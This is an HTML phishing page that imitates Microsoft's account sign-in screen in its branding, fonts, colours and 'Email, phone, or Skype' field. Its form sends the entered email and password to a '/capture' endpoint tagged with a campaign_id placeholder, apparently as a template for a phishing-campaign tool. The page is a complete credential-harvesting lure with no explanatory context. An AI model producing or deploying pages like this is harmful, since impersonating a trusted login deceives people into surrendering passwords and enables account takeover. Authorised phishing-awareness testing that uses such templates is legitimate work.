<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #fff; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 440px; padding: 44px; }
        .logo { margin-bottom: 16px; color: #737373; font-size: 24px; font-weight: 600; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
        input { width: 100%; padding: 12px; font-size: 15px; border: 1px solid #8a8886; border-radius: 4px; outline: none; margin-bottom: 16px; }
        input:focus { border-color: #0067b8; }
        button { width: 100%; background: #0067b8; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: 600; border-radius: 4px; cursor: pointer; }
        button:hover { background: #005da6; }
        .links { display: flex; justify-content: space-between; font-size: 13px; margin-top: 16px; }
        .links a { color: #0067b8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Microsoft</div>
        <h1>Sign in</h1>
        <form method="POST" action="/capture?c={campaign_id}">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Create account</a>
        </div>
    </div>
</body>
</html>
